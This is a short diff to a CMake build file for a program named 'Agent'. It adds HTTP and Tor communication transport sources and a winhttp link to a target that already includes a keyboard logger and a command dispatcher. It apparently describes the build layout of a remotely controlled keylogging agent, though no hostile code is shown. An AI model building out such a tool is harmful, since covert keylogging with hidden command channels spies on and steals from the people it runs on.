@@ -20,10 +20,24 @@ add_executable (
   "KeyBoardLogger.h"
   "CommandDispatcher.cpp"
   "CommandDispatcher.h"
+  "CommunicationTransport.h"
+  "CommunicationConfig.h"
+  "CommunicationManager.cpp"
+  "CommunicationManager.h"
+  "CommunicationTransportFactory.h"
+  "CommunicationTransportFactory.cpp"
+  "HttpCommunicationTransport.cpp"
+  "HttpCommunicationTransport.h"
+  "TorCommunicationTransport.cpp"
+  "TorCommunicationTransport.h"
   )
 
 if (CMAKE_VERSION VERSION_GREATER 3.12)
   set_property(TARGET Agent PROPERTY CXX_STANDARD 20)
+endif()
+
+if(WIN32)
+  target_link_libraries(Agent PRIVATE winhttp)
 endif()
 
 # TODO: Add tests and install targets if needed.
